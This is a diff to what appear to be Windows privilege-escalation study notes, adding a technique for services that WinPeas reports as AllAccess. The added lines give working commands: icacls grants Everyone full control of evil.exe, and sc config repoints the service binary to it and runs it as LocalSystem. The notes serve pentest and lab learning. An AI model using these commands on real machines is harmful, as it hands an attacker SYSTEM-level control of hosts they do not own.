@@ -185,5 +185,15 @@ Stop-Service SusService
 
 Restart-Service SusService
 ```
+- if you run WinPeas and you see something like AllAccess next to a service, this means bingo. You can modify everything about that service including the path to binary that gets executed!
+```cmd
+# check out the context that the service runs under
+sc qc <susService>
+# give full perms to your evil.exe
+icacls C:\Users\Public\evil.exe /grant Everyone:F
+# modify the service to run your evil.exe and run it under System
+sc config SusService binpath="C:\Users\Public\evil.exe" obj=LocalSystem
+
+```
 
 Well that is about it. If there is nothing so far, it is likely to be related to services or scheduled tasks or some sensitive file buried in the filesystem which winpeas can do for you.
